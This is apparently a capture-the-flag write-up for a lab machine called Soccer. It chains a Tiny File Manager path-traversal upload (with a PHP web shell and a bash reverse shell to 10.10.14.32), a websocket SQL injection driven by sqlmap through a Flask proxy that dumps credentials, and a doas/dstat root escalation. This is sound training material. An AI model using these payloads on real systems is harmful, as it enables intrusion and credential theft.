### Overview
Vulnerability in initial file manager leading to command execution on the server, which lead to locating a new virtual host that has sql injection that leaks the user credential for ssh. 

On the server a binary that has set uid is set that allows for privileged escalation 

### Initial Fingerprinting 
- OS: Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- Ports:   
	- 22: OpenSSH 8.2p1
	- 80: nginx 1.18.0 (Ubuntu)
		- http://soccer.htb/
	- 9091:  xmltec-xmlmail
    
### Soccer.htb Recon

- Version: H3K Tiny File Manager - 2.4.3 - CVE-2021-45010
- Github: [https://tinyfilemanager.github.io/](https://tinyfilemanager.github.io/)
- Default Credentials:
	- admin:admin@123
	- User:12345

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcahedhjmmfgUkgZSTCMCC8QQvJGx8OS2knCOfo982LmljvROJ6LAiIoOM5d2hGQxQKpSBoUHNT8OI6V40OwhKQCu0G6Uy0TP23MhLqJxtdwnucQqDlFapwf6QCbBFUEc_8kyD7cQ?key=q9MaodwMauRwDznDaBSNew)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfbxoUjpj1qCDz0NnU3i1sbiGBn7sgwButsk59FfvC1AdHPrIzCj0bLgFuMLEDWwPZ-c8Cb1FmdDBYxKPZkNwSzEESpSjzw92WohqwJqSUgUXeBY95YqGcXBO9M_Rs0sW7fA04alQ?key=q9MaodwMauRwDznDaBSNew)

### First Exploitation

CVE-2021-45010 - A path traversal vulnerability that allows a user to execute php code 

Using the default admin credential, we will be able to login to the Tiny File Manager Dashboard. 

After testing out the file upload function, we will notice that we do not have the sufficient permission to upload the file in most of the folders except for tiny/uploads.

With this information, we can now leverage CVE-2021-45010 to get remote code execution on the tiny file manager server as shown in the below images:

PHP RCE payload:
```php
<?php echo system($_REQUEST['cmd']); ?>
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdwUtryHCsDeNkDxGpkyRNvHxOBs3edjPMhKNwnPq04oaHJavX5Q9LroWC0mbSaDmM5y7wWRLg_crsU4q3xASYaELJjJ0ZTdinbfxPLmTE6yCnoyV4cYKVtwNhyp0xwr7Tf4YpLXA?key=q9MaodwMauRwDznDaBSNew)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc3Wz2WxAd0t0TdZdMVkiDS5gq7XBePqh0595bVRCYhrj8AEZL25sYhbm0tlInk1UNDLFPI3Nm86jycVuxxXrrjIAhTGXbpG4uzt0HgRZVUGL6tLM1MRGwLoAHOrm4utvC7bWgL?key=q9MaodwMauRwDznDaBSNew)

Tests out the payload to ensure that it is working 
- http://soccer.htb/tiny/uploads/shell.php?cmd=id
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXelexh7lsOEZeFFkB9mLyIN8zmxOe8BxmKS8JBpI6v_aeI3trZ2qfdkaiwaIfTNzMJroh10KxXJGynUtTpQocLWBXJz5Z7gnHUVk3Fux2JMYVAzoXgQ_duHwhRc-qUVYkklFd--9Q?key=q9MaodwMauRwDznDaBSNew)

Now for the reverse shell, set up a listener in the host machine nc -lvnp 4444  
Payload for the reverse shell: 
```bash
http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.32/4444 0>&1'
```
- Url Encoded: 
```bash
http://soccer.htb/tiny/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2fdev%2ftcp%2f10.10.14.32%2f4444%200%3E%261%27
```
    
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfuehsf-cLZ9na1bNcRgVXVUA8MfvqOmep5p3HRbDNNuNX11bDQRzgWzDMAcLjRrnplOJ1JtG3FoO-k3NNn0ZJpik_uymCbVmmXA_H6zMSLkAQbYvR_xpYP9RE2hJvID7SaFQbcrw?key=q9MaodwMauRwDznDaBSNew)

### Second Recon

Now that we have accessed command execution on the Tiny File Manager server, notice that we are login as www-data user and do not have access to any user.txt file. After some enumeration on the server, we will find that there is another virtual host hosted in the server under /etc/nginx/site-enabled/soc-player.htb - soc-player.soccer.htb.  

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcx8tKvDpd5RfQbV7p8LmGrLWz8iWFEhcj6ZplL4GpSyflLmvOn6HZ-rSZDs_vlNmpDZ4oJsllvsSdYaNGKwxQ5fZhgelg9-QMeW4r4orGM-FiS4pN97PGvOYVQBR5Ls-6pwcoceQ?key=q9MaodwMauRwDznDaBSNew)

### Soc-player.soccer.htb Fingerprinting 
- Running on a Node Express JS Application (based on the error message) - [ref](https://0xdf.gitlab.io/cheatsheets/404#:~:text=this%20template.-,Express,-Express%20is%20a) 
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcHHE2_qNZdAWGljt4MLAd_xG8781ocXWHBP1x_AvX37yb6h5DoJayjnxiaX3_5Y35qDgZBOronkcOJLdlv5bUy-4wN4yn2JBf-SWhbUbS7jaNJIOW0cun4Oxw9d8p8U5g9Ac0UYA?key=q9MaodwMauRwDznDaBSNew)
- Allows user signup and login 
- A ticketing system that allows user to view ticket information 
    
### Second Exploit 
After some testing in the application, found that the application is vulnerable to SQL injection under /check, which uses a websocket connection to send the request 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeCgZr2BC7ib1ASU0rp3qEqbycSxv5ar8ZmugJIzRN7SGMw5LLB5VDnAJg8VCIDZCdAUGZN4A2-kdtw8VMVMLb4HprUa-EBlUOMhjEtDX6ce9UvHEyEso02BtAccEA0sCgKMeOt?key=q9MaodwMauRwDznDaBSNew)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXffll4ekBBlOhBgmLOaSqRs7G2TPxBYg7ipAokVblxxOpLlxVBdpYDer05hr-hrIDwYK6lJJfslheOUKoK5U6jp1Q3yDmv3CZ7DJSmrrGPx60KmtUPwBuGlNQ21cg6lp5EXxpym6g?key=q9MaodwMauRwDznDaBSNew)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc1XWEPBIkBSp1f5DcVz8E-1Po0k0d_cPOLrY7suF-fgYfIpr1_nfzddxzMshQkT5j0LV2kxSkCydSp3PzAAQiH2J2Axst8cV_cgEEA1w-2tR2i7x1i5OeD9SjbIXoezSMzZtLHJg?key=q9MaodwMauRwDznDaBSNew)

As this is a boolean based SQL injection, sqlmap is used to speed up the sql injection. But as the vulnerable web request uses websocket, a simple flask proxy server is created that converts http request to websocket connection so that sqlmap will be able to send the sql injection payload to the websocket endpoint.  

```python
from flask import Flask
from flask import request
import asyncio
import websockets
import json

async def connect_and_send(payload):
    uri = "ws://soc-player.soccer.htb:9091"  
    try:
        async with websockets.connect(uri) as websocket:
            message_to_send = {"id": payload}

            # Send a request
            await websocket.send(json.dumps(message_to_send))
            print(f"Sent: {message_to_send}")

            # Optionally, receive a response
            response = await websocket.recv()
            print(f"Received: {response}")
            return response

    except websockets.exceptions.ConnectionClosedOK:
        print("Connection closed gracefully.")
    except websockets.exceptions.ConnectionClosedError as e:
        print(f"Connection closed with error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

app = Flask(__name__)

@app.route("/wsproxy", methods=['GET'])
def wsproxy():
    payload = request.args.get('payload')
    """
    This function is executed when a GET request is made to /greet/<name>.
    It takes a 'name' as a path variable and returns a personalized greeting.
    """

    response = asyncio.run(connect_and_send(payload))

    return response
    
if __name__ == "__main__":
    app.run(debug=True)
```

#### Database Enumeration 
Get database type - mysql 
- sqlmap -u "[http://127.0.0.1:5000/wsproxy?payload=1"](http://127.0.0.1:5000/wsproxy?payload=1%22)![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc39UshZhM3HD-F_bz2o3CktkNAMLBrA2rTT13LPRxHI7cUd0XoCs7HbHXXkxbgeNhhA5qCfZmvVfCdKGgqozn9JHJxzFCuIgTp3eDTdWGuiBjMrCSDePHntU4so8ZFXkvJ5Ar3-Q?key=q9MaodwMauRwDznDaBSNew)

Get mysql databases - notable database - soccer_db
- sqlmap -u "http://127.0.0.1:5000/wsproxy?payload=1" --dbs![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdrrmibyV0pWdrIMiJQ1wqXsEMNnFXByh-eZTEj_UE0pakKVsUU7j-EXhv0ilLz1fS7zDyPF4jlMLvADxgqkxiUuvb1ig0huLwbv0IPbiD88MSrKX3ILE9LGIuKmaOTMCTEcsQE5g?key=q9MaodwMauRwDznDaBSNew)
    
Get soccer_db table names - accounts
- sqlmap -u "http://127.0.0.1:5000/wsproxy?payload=1" -D soccer_db --tables![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfFekrXJAEvVhQ4MdwcbGeVJQKEVyAmBt75RsPe2Tg6cWhZQagfCB7avTmCpEgVVxDPRIMzqGQ0jhOPWdW5QjXDd5GKw-ahIscjyVqd35xjfkNrGnFfRs6TvQPUWyp9GfLmau2DGQ?key=q9MaodwMauRwDznDaBSNew)
    
Get accounts table columns
- sqlmap -u "http://127.0.0.1:5000/wsproxy?payload=1" -D soccer_db -T accounts --columns
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdIcbjy93d0gWVMKrj6Ewv2ildg5BEicZHGzZY6PvSS_bMu7tZPHBG91lkoDVN446tm-QwTDtGLiLiF4Gd37b9cmz-0pX2Y3wdN6GbBMabqqS6K6YYfFlHGuMVlh5WSFC0GDjc8?key=q9MaodwMauRwDznDaBSNew)

Dump accounts table information 
- sqlmap -u "http://127.0.0.1:5000/wsproxy?payload=1" -D soccer_db -T accounts -C email,id,password,username --dump ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdBp7Ro1g9nlP6_7QHaOXbgyNKrqcSdZMf4BkuCNLLJ5tvwK1Toz_mBuBEur8tVQu2jtFPA11uvl55q3PRpcYo0-TqP-qZYXMx92qauRAdV1RrKNuW98mqkGP0LYlMVtXPV3jDfGA?key=q9MaodwMauRwDznDaBSNew)
    
- Credential:
	- Email: player@player.htb 
	- Username: player
	- Password: PlayerOftheMatch2022

With this credential, we will be able to ssh into the server as player and the user flag. 

### Third Exploit - Privilege Escalation 
Right of the bat, when enumerating to server to look for any binary with Set UID assigned, we immediately get a hit on something that stands out - /usr/local/bin/doas

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd6Ul90IeKgxwmXkSbGJs90_tcH0TWTrYqqQ5JLszd--KQ2Ak0kZS71XxFkuqMQRufJ9uBuEm-vluj_UpcnuLHoIlt3ZbZnBeYWK7M17xxlNC2rAtq__mswBYVaOI24tjTosViT2Q?key=q9MaodwMauRwDznDaBSNew)

A quick google search immediately show that this has potential as this doas is essential an alternative to sudo command which allow user to run command another user - [documentation](https://wiki.debian.org/Doas)

But we will quickly see that it is not as simple as running a command as root as we are not able run any commands

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdgMnFDWtVUG045n7udQeh-XQhdHqC4OdAhQFP0KOu_WzB3Pa35L5PtIzYE-zRpHZGuPALFbH6ck6TdTiLKucjYr6wmcOyUAkTl_5LN1HOjmxfB5UTssDUWn376mldG4SEKISty9A?key=q9MaodwMauRwDznDaBSNew)

Upon further reading the documentation, it states that there should be a config file under `/etc/doas.conf` which would have the configuration for doas which would show us what commands can be executed, but there are no config files under `/etc/doas.conf`. To get the config file we can enumerate the server for `doas.conf` using find. 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdplA-ICNrGxhYSHwgXhSH8iARbLMh-PIPv3hTd1NyDNu6IcnNyo9vWwEIw_GMPUXCN4rSBiYIWquCG8kc8s1FOpZQwxoXYVhXwguBO0SFH94QNJkKOA-Uxc8dX-opWQCA5G0Xa?key=q9MaodwMauRwDznDaBSNew)

From the config file it shows that we will be able to execute dstat as root using doas, and a quick search in [GTFObins](https://gtfobins.github.io/gtfobins/dstat/), shows that dstat can be used to invoke shell  
```bash 
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_1.py

doas -u root /usr/bin/dstat --1
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfPvhbBtBY-760abvxgahJ0uISZfNfWLa2rz5YFu5J6tk4xiRqyJ2uxcYVM2yDVOF-W77HWEZInQqrfMg1EIhqbbqBKWe_YaCMCdpD5ZO-lacxNc8rDyajIZTmaPQZpHhKB_rdFdw?key=q9MaodwMauRwDznDaBSNew)

Once the command is executed, a root shell will be spawned 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfL-03x_7yginoz-HlA80NUihxLqSGa8TOm0ZCOJrbxyLl103tP2jO_PrCNHNH3K3hJvylHVlWq-c0Fp5mKUhHPA2_PohkUhyoO8qBU-5S4m-muAFUWq-aG24gwlKBCCKHIW2T-Fw?key=q9MaodwMauRwDznDaBSNew)

### Deep dive into the the sql injection 

One thing I was curious about about the sql injection vulnerability within soc-player.soccer.htb is that adding a single quote (’) at the start caused the sql injection to fail as sql injection generally starts with a single quote to close out the injection where clause condition. 

With root access to the box, I was able to down the application to review it.

Upon inspecting the code, I found that the reason why adding the single quote did not work is because single quote was not used in the query as the mysql package would have handled that and converted the value into a proper sql command. Hence, adding just one single quote would have caused an error in the sql command

So essentially in this particular case we are actually injection node js code into the application which would then be interpreted as sql 

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeoR1K4WNE6i2Zr1iIWklFOc8oZnv7jA2ZXSyqbfx2Q0ntaQhsZr4zm4GGd0ytMvRYNXkJQXPgRV3244i-rxlSP67X47pDqC6NT6LbpyrHZziabYYEO6W7Cb6mCaQmU25f3nmmneg?key=q9MaodwMauRwDznDaBSNew)